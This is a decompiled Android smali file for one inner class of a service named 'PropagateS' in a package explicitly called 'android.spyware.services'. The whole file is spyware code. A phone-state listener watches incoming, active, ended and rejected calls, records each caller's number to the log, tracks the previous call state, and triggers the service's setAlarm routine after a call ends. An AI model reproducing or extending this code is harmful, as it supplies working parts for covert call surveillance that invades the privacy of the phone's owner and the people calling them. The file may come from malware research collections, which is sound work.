.class Landroid/spyware/services/PropagateS$1;
.super Landroid/telephony/PhoneStateListener;
.source "PropagateS.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Landroid/spyware/services/PropagateS;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Landroid/spyware/services/PropagateS;


# direct methods
.method constructor <init>(Landroid/spyware/services/PropagateS;)V
    .registers 2
    .param p1, "this$0"    # Landroid/spyware/services/PropagateS;

    .prologue
    .line 48
    iput-object v1, v0, Landroid/spyware/services/PropagateS$1;->this$0:Landroid/spyware/services/PropagateS;

    invoke-direct {v0}, Landroid/telephony/PhoneStateListener;-><init>()V

    return-void
.end method


# virtual methods
.method public onCallStateChanged(ILjava/lang/String;)V
    .registers 6
    .param p1, "state"    # I
    .param p2, "callerNumber"    # Ljava/lang/String;

    .prologue
    .line 51
    packed-switch v4, :pswitch_data_c0

    .line 77
    :cond_3
    :goto_3
    return-void

    .line 53
    :pswitch_4
    const-string v0, "::trace"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-class v2, Landroid/spyware/services/PropagateS;

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "->onCallStateChanged:incoming call - "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 54
    iget-object v0, v3, Landroid/spyware/services/PropagateS$1;->this$0:Landroid/spyware/services/PropagateS;

    # setter for: Landroid/spyware/services/PropagateS;->previousState:I
    invoke-static {v0, v4}, Landroid/spyware/services/PropagateS;->access$002(Landroid/spyware/services/PropagateS;I)I

    goto :goto_3

    .line 59
    :pswitch_2c
    const-string v0, "::trace"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-class v2, Landroid/spyware/services/PropagateS;

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "->onCallStateChanged:on call - "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 60
    iget-object v0, v3, Landroid/spyware/services/PropagateS$1;->this$0:Landroid/spyware/services/PropagateS;

    # setter for: Landroid/spyware/services/PropagateS;->previousState:I
    invoke-static {v0, v4}, Landroid/spyware/services/PropagateS;->access$002(Landroid/spyware/services/PropagateS;I)I

    goto :goto_3

    .line 65
    :pswitch_54
    iget-object v0, v3, Landroid/spyware/services/PropagateS$1;->this$0:Landroid/spyware/services/PropagateS;

    # getter for: Landroid/spyware/services/PropagateS;->previousState:I
    invoke-static {v0}, Landroid/spyware/services/PropagateS;->access$000(Landroid/spyware/services/PropagateS;)I

    move-result v0

    const/4 v1, 0x2

    if-ne v0, v1, :cond_8d

    .line 66
    const-string v0, "::trace"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-class v2, Landroid/spyware/services/PropagateS;

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "->onCallStateChanged:call ended - "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 67
    iget-object v0, v3, Landroid/spyware/services/PropagateS$1;->this$0:Landroid/spyware/services/PropagateS;

    # setter for: Landroid/spyware/services/PropagateS;->previousState:I
    invoke-static {v0, v4}, Landroid/spyware/services/PropagateS;->access$002(Landroid/spyware/services/PropagateS;I)I

    .line 69
    iget-object v0, v3, Landroid/spyware/services/PropagateS$1;->this$0:Landroid/spyware/services/PropagateS;

    iget-object v1, v3, Landroid/spyware/services/PropagateS$1;->this$0:Landroid/spyware/services/PropagateS;

    # invokes: Landroid/spyware/services/PropagateS;->setAlarm(Landroid/content/Context;)V
    invoke-static {v0, v1}, Landroid/spyware/services/PropagateS;->access$100(Landroid/spyware/services/PropagateS;Landroid/content/Context;)V

    goto/16 :goto_3

    .line 70
    :cond_8d
    iget-object v0, v3, Landroid/spyware/services/PropagateS$1;->this$0:Landroid/spyware/services/PropagateS;

    # getter for: Landroid/spyware/services/PropagateS;->previousState:I
    invoke-static {v0}, Landroid/spyware/services/PropagateS;->access$000(Landroid/spyware/services/PropagateS;)I

    move-result v0

    const/4 v1, 0x1

    if-ne v0, v1, :cond_3

    .line 71
    const-string v0, "::trace"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-class v2, Landroid/spyware/services/PropagateS;

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "->onCallStateChanged:call rejected - "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 72
    iget-object v0, v3, Landroid/spyware/services/PropagateS$1;->this$0:Landroid/spyware/services/PropagateS;

    # setter for: Landroid/spyware/services/PropagateS;->previousState:I
    invoke-static {v0, v4}, Landroid/spyware/services/PropagateS;->access$002(Landroid/spyware/services/PropagateS;I)I

    goto/16 :goto_3

    .line 51
    nop

    :pswitch_data_c0
    .packed-switch 0x0
        :pswitch_54
        :pswitch_4
        :pswitch_2c
    .end packed-switch
.end method
